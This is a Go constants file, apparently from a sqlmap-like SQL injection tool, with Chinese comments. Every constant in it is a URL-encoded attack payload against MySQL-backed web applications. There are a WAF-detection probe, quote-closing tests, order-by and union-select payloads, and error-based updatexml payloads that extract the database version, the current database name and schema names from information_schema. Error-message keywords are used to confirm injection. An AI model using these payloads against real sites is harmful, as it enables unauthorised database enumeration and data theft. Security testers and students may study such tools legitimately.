package constant

const (
	// DetectWafPayload 检测WAF的Payload
	DetectWafPayload = "'%20or%201=1--+"
	// SuffixCondition 检测闭合符号的Payload
	SuffixCondition = "%20--+"
	// SuffixPayload 检测闭合符号的Payload
	SuffixPayload = "%20Or%20'SQLMaP'='SQLMaP'%20--+"
	// DetectedKeyword 检测到注入的关键字
	DetectedKeyword = "You have an error in your SQL syntax"
	// Annotator 注释符
	Annotator = "--+"
	// Space 空格
	Space = "%20"
	// VersionFunc 版本函数
	VersionFunc = "version()"
	// DatabaseFunc 数据库函数
	DatabaseFunc = "database()"
)

// Union Select部分的常量
const (
	// OrderKeyword 检测OrderBy语句的关键字
	OrderKeyword = "Unknown column"
	// UnionSelectOrderPayload 检测OrderBy的Payload
	UnionSelectOrderPayload = "order%20by"
	// UnionSelectUnionCondition Union Select需要否定的条件
	UnionSelectUnionCondition = "0"
	// UnionSelectUnionSql Union Select语句
	UnionSelectUnionSql = "union%20select"
)

// Error Based部分的常量
const (
	// UpdatexmlFunc 报错注入检测函数
	// 这个报错函数在后续利用中较麻烦，所以采用Polygon做后续
	UpdatexmlFunc = "updatexml()"
	// UpdatexmlErrorKeyword 报错回显的关键字
	UpdatexmlErrorKeyword = "XPATH syntax error"
	// ErrorBasedKeyword 检测到报错注入的关键字
	ErrorBasedKeyword = "Incorrect parameter count in the call to native function"
	// UpdatexmlVersionPayload 报错注入获得版本
	UpdatexmlVersionPayload = "%20and%20updatexml(2,concat(0x7e,version(),0x7e),1)--+"
	// UpdatexmlDatabasePayload 报错注入获得当前数据库
	UpdatexmlDatabasePayload = "%20and%20updatexml(2,concat(0x7e,database(),0x7e),1)--+"
	// UpdatexmlAllDatabasesPayload 报错获得所有数据库
	UpdatexmlAllDatabasesPayload = "%20and%20updatexml(2,concat(0x7e,(select%20schema_name%20" +
		"from%20information_schema.schemata%20limit%200,1),0x7e),1)--+"
)
